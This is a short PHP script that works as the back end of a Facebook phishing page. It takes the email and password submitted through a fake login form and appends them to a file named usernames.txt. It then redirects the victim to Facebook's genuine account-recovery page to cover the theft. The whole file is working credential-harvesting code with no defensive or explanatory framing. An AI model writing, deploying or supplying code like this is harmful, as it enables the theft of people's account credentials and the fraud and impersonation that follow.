<?php

file_put_contents("usernames.txt", "Facebook :- username : " . $_POST['email'] . "  || Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/recover/initiate/');
exit();
